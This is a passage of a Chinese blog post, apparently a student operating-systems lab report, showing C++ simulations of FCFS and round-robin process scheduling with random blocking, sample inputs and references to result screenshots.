class="hljs-keyword">void</span> <span class="hljs-title">print_process_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//输出进程信息</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">float</span> sumwait = <span class="hljs-number">0</span>;<br>    cout &lt;&lt; <span class="hljs-string">&quot;进程名字  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;到达时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;服务时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;开始执行时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;结束执行时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;周转时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;等待时间  &quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; p[i].name<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].arrive_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].service_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; p[i].start_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; p[i].end_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].turnaround_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].wait_time<br>             &lt;&lt; endl;<br>        sumwait += p[i].wait_time;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;平均等待时间为：&quot;</span> &lt;&lt; <span class="hljs-built_in">setprecision</span>(<span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-built_in">setiosflags</span>(ios::fixed) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">float</span></span>(sumwait / n) &lt;&lt; endl;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="阻塞函数"><a class="markdownIt-Anchor" href="#阻塞函数"></a> 阻塞函数</h5><blockquote><p>随机概率阻塞</p><p>设置了30%的阻塞概率</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">block</span><span class="hljs-params">()</span> <span class="hljs-comment">//阻塞函数，随机概率阻塞</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> a;<br>    a = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">10</span>;<br>    <span class="hljs-comment">//return 0;</span><br>    <span class="hljs-keyword">if</span> (a &gt;= <span class="hljs-number">0</span> &amp;&amp; a &lt; <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="源代码"><a class="markdownIt-Anchor" href="#源代码"></a> 源代码</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXname 100</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Process</span> //进程结构体，表示进程信息</span><br><span class="hljs-class">&#123;</span><br>    string name;         <span class="hljs-comment">//进程名字</span><br>    <span class="hljs-keyword">int</span> arrive_time;     <span class="hljs-comment">//到达时间</span><br>    <span class="hljs-keyword">int</span> service_time;    <span class="hljs-comment">//进程运行时间</span><br>    <span class="hljs-keyword">int</span> wait_time;       <span class="hljs-comment">//进程等待时间</span><br>    <span class="hljs-keyword">int</span> remain_time;     <span class="hljs-comment">//进程剩余运行时间</span><br>    <span class="hljs-keyword">int</span> turnaround_time; <span class="hljs-comment">//周转时间</span><br>    <span class="hljs-keyword">int</span> start_time;      <span class="hljs-comment">//进程开始运行时间</span><br>    <span class="hljs-keyword">int</span> end_time;        <span class="hljs-comment">//进程结束时间</span><br>    <span class="hljs-comment">//int time_slice;      //进程时间片</span><br>&#125; run_process, p[MAXname];<br><br><span class="hljs-keyword">int</span> n;                <span class="hljs-comment">//进程数量</span><br><span class="hljs-keyword">int</span> current_time = <span class="hljs-number">0</span>; <span class="hljs-comment">//当前时间</span><br><span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br>queue&lt;Process&gt; ready_queue, block_queue, run_queue;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(Process &amp;a, Process &amp;b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a.arrive_time &lt; b.arrive_time;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_init</span><span class="hljs-params">()</span> <span class="hljs-comment">//进程初始化</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入进程数量&quot;</span> &lt;&lt; endl;<br>    cin &gt;&gt; n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;请输入第&quot;</span> &lt;&lt; i + <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-string">&quot;个进程的名字  到达时间  服务时间&quot;</span> &lt;&lt; endl;<br>        cin &gt;&gt; p[i].name &gt;&gt; p[i].arrive_time &gt;&gt; p[i].service_time;<br>        p[i].remain_time = p[i].service_time;<br>    &#125;<br>    run_process.name = <span class="hljs-string">&quot;0&quot;</span>; <span class="hljs-comment">//当前无进程运行</span><br>    <span class="hljs-built_in">sort</span>(p, p + n, cmp);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        block_queue.<span class="hljs-built_in">push</span>(p[i]); <span class="hljs-comment">//将进程加入阻塞队列（未达到则视为阻塞）</span><br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">nextprocess</span><span class="hljs-params">()</span> <span class="hljs-comment">//取下一个进程</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>()) <span class="hljs-comment">//当就绪队列非空时</span><br>    &#123;<br>        run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//取下个进程</span><br>        run_process.start_time=current_time;<br>        run_process.wait_time += current_time - run_process.arrive_time; <span class="hljs-comment">//计算等待时间</span><br>        ready_queue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">//否则将运行进程置为空</span><br>        run_process.name = <span class="hljs-string">&quot;0&quot;</span>;<br>    <br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">block</span><span class="hljs-params">()</span> <span class="hljs-comment">//阻塞函数，随机概率阻塞</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> a;<br>    a = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">10</span>;<br>    <span class="hljs-comment">//return 0;</span><br>    <span class="hljs-keyword">if</span> (a &gt;= <span class="hljs-number">0</span> &amp;&amp; a &lt; <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_schedule</span><span class="hljs-params">()</span> <span class="hljs-comment">//进程调度函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">//随机数种子</span><br>    cout &lt;&lt; endl<br>         &lt;&lt; <span class="hljs-string">&quot;------------------------------------FCFS调度算法------------------------------------&quot;</span> &lt;&lt; endl<br>         &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;当前时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;当前进程  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程到达时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程等待时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程服务时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;剩余运行时间  &quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//当三个队列均为空时，说明进程全部运行完</span><br>            <span class="hljs-keyword">break</span>;                                                                 <span class="hljs-comment">//结束</span><br><br>        <span class="hljs-keyword">if</span> (!block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; block_queue.<span class="hljs-built_in">front</span>().arrive_time &lt;= current_time)<br>        &#123;                                                   <span class="hljs-comment">//阻塞队列非空且队首元素到达时间已到当前时间</span><br>            block_queue.<span class="hljs-built_in">front</span>().arrive_time = current_time; <span class="hljs-comment">//将进入就绪队列的时间作为进程到达时间（针对于阻塞过的进程）</span><br>            ready_queue.<span class="hljs-built_in">push</span>(block_queue.<span class="hljs-built_in">front</span>());          <span class="hljs-comment">//则加入就绪队列</span><br>            block_queue.<span class="hljs-built_in">pop</span>();                              <span class="hljs-comment">//从阻塞队列删除</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//就绪队列非空和运行进程为空时</span><br>        &#123;<br>            run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//则从就绪对列取首元素</span><br>            run_process.start_time=current_time;<br>            ready_queue.<span class="hljs-built_in">pop</span>();                 <span class="hljs-comment">//从就绪队列删除</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//若当前无运行进程，则输出空</span><br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name &lt;&lt; endl;<br>            current_time++;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123; <span class="hljs-comment">//当前有运行进程则输出信息</span><br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.arrive_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.wait_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.service_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.remain_time<br>                 &lt;&lt; endl;<br>            current_time++;            <span class="hljs-comment">//当前时间加1</span><br>            run_process.remain_time--; <span class="hljs-comment">//进程剩余运行时间减1</span><br><br>            <span class="hljs-keyword">if</span> (run_process.remain_time == <span class="hljs-number">0</span>) <span class="hljs-comment">//当进程剩余运行时间为0</span><br>            &#123;<br>                run_process.end_time=current_time;<br>                run_process.turnaround_time=current_time-run_process.start_time;<br>                p[t++] = run_process;<br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//取下一个进程</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">block</span>()) <span class="hljs-comment">//当进程有运行时间和时间片时，可能发生阻塞</span><br>            &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;-----------------进程阻塞，切换进程----------------&quot;</span> &lt;&lt; endl;<br>                run_process.arrive_time = current_time; <span class="hljs-comment">//若发生阻塞，修改当前进程到达时间</span><br>                block_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//并加入阻塞队列中</span><br>                <span class="hljs-built_in">nextprocess</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_process_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//输出进程信息</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">float</span> sumwait = <span class="hljs-number">0</span>;<br>    cout &lt;&lt; <span class="hljs-string">&quot;进程名字  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;到达时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;服务时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;开始执行时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;结束执行时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;周转时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;等待时间  &quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; p[i].name<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].arrive_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].service_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; p[i].start_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; p[i].end_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].turnaround_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].wait_time<br>             &lt;&lt; endl;<br>        sumwait += p[i].wait_time;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;平均等待时间为：&quot;</span> &lt;&lt; <span class="hljs-built_in">setprecision</span>(<span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-built_in">setiosflags</span>(ios::fixed) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">float</span></span>(sumwait / n) &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">process_init</span>();<br>    <span class="hljs-built_in">process_schedule</span>();<br>    <span class="hljs-built_in">print_process_information</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="程序初值和运行结果"><a class="markdownIt-Anchor" href="#程序初值和运行结果"></a> 程序初值和运行结果</h4><p><strong>不考虑阻塞：</strong></p><p>初值：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">3</span><br><span class="hljs-attribute">ghh</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">ga</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">hr</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><p>运行结果</p><p><img src="/posts/3f961b4f/image-20211112212432678.png" alt="image-20211112212432678"></p><p><strong>考虑阻塞：</strong></p><p>初值：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">3</span><br><span class="hljs-attribute">ghh</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">ga</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">hr</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><p>运行结果：</p><p><img src="/posts/3f961b4f/image-20211112212806073.png" alt="image-20211112212806073"></p><h3 id="rr调度算法"><a class="markdownIt-Anchor" href="#rr调度算法"></a> RR调度算法</h3><h4 id="数据结构-2"><a class="markdownIt-Anchor" href="#数据结构-2"></a> 数据结构</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Process</span> //进程结构体，表示进程信息</span><br><span class="hljs-class">&#123;</span><br>    string name;         <span class="hljs-comment">//进程名字</span><br>    <span class="hljs-keyword">int</span> arrive_time;     <span class="hljs-comment">//到达时间</span><br>    <span class="hljs-keyword">int</span> service_time;    <span class="hljs-comment">//进程运行时间</span><br>    <span class="hljs-keyword">int</span> wait_time;       <span class="hljs-comment">//进程等待时间</span><br>    <span class="hljs-keyword">int</span> remain_time;     <span class="hljs-comment">//进程剩余运行时间</span><br>    <span class="hljs-keyword">int</span> turnaround_time; <span class="hljs-comment">//周转时间</span><br>    <span class="hljs-keyword">int</span> start_time;      <span class="hljs-comment">//进程开始运行时间</span><br>    <span class="hljs-keyword">int</span> end_time;        <span class="hljs-comment">//进程结束时间</span><br>    <span class="hljs-keyword">int</span> time_slice;      <span class="hljs-comment">//进程时间片</span><br>&#125; run_process, p[MAXname];<br>queue&lt;Process&gt; ready_queue, block_queue, run_queue;<br></code></pre></div></td></tr></table></figure><h4 id="符号说明-2"><a class="markdownIt-Anchor" href="#符号说明-2"></a> 符号说明</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;                <span class="hljs-comment">//进程数量</span><br><span class="hljs-keyword">int</span> current_time = <span class="hljs-number">0</span>; <span class="hljs-comment">//当前时间</span><br><span class="hljs-keyword">int</span> q = <span class="hljs-number">0</span>;            <span class="hljs-comment">//设定的时间片大小</span><br><span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="函数说明-2"><a class="markdownIt-Anchor" href="#函数说明-2"></a> 函数说明</h4><blockquote><p>函数设计基本和FCFS相同</p></blockquote><blockquote><p>少数的不同之处是</p><ul><li>进程初始化函数加上了时间片的初始化</li></ul></blockquote><blockquote><ul><li>进程调度函数加上了时间片用完时的进程切换</li><li>时间片用完时回复当前进程的时间片，同时更新到达时间，并将其再次入队</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">procese_schedule</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    `````````<span class="hljs-comment">//省略部分具体见源代码</span><br>    `````````<br>        current_time++;            <span class="hljs-comment">//当前时间加1</span><br>            run_process.remain_time--; <span class="hljs-comment">//进程剩余运行时间减1</span><br>            run_process.time_slice--;  <span class="hljs-comment">//进程时间片时间减1</span><br><span class="hljs-keyword">if</span> (run_process.remain_time == <span class="hljs-number">0</span>) <span class="hljs-comment">//当进程剩余运行时间为0</span><br>            &#123;<br>                p[t++] = run_process;<br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//取下一个进程</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (run_process.time_slice == <span class="hljs-number">0</span>) <span class="hljs-comment">//当进程时间片为0时</span><br>            &#123;<br>                run_process.time_slice = q;             <span class="hljs-comment">//恢复时间片</span><br>                run_process.arrive_time = current_time; <span class="hljs-comment">//更新到达时间</span><br>                ready_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//再次入队</span><br><br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//取下一个进程</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">block</span>()) <span class="hljs-comment">//当进程有运行时间和时间片时，可能发生阻塞</span><br>            &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;-----------------进程阻塞，切换进程----------------&quot;</span> &lt;&lt; endl;<br>                run_process.arrive_time = current_time; <span class="hljs-comment">//若发生阻塞，修改当前进程到达时间</span><br>                block_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//并加入阻塞队列中</span><br>                <span class="hljs-built_in">nextprocess</span>();<br>            &#125;<br>    `````````<span class="hljs-comment">//省略部分具体见源代码</span><br>    `````````<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="源代码-2"><a class="markdownIt-Anchor" href="#源代码-2"></a> 源代码</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 